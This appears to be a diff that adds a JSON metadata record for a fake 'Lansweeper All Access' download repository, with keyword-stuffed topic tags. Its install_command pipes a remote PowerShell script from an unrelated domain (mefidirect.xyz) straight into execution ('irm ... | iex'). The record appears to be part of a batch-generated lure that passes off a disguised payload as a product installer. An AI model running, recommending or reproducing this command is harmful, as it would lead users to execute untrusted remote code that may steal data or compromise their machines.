@@ -1,0 +1,28 @@
+{
+  "repo": "lansweeper-all-access",
+  "product": "Lansweeper All Access",
+  "kind": "utility",
+  "install_type": "download",
+  "download_url": "https://lansweeper.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "utility",
+  "topics": [
+    "lansweeper-x64",
+    "lansweeper-getting-started",
+    "disk-cleaner",
+    "startup-manager",
+    "lansweeper-suite",
+    "lansweeper-download-page",
+    "hardware-info",
+    "pro-workflow",
+    "office-ready",
+    "lansweeper-windows",
+    "home-studio",
+    "local-first",
+    "lansweeper-install-help",
+    "no-account-needed"
+  ]
+}
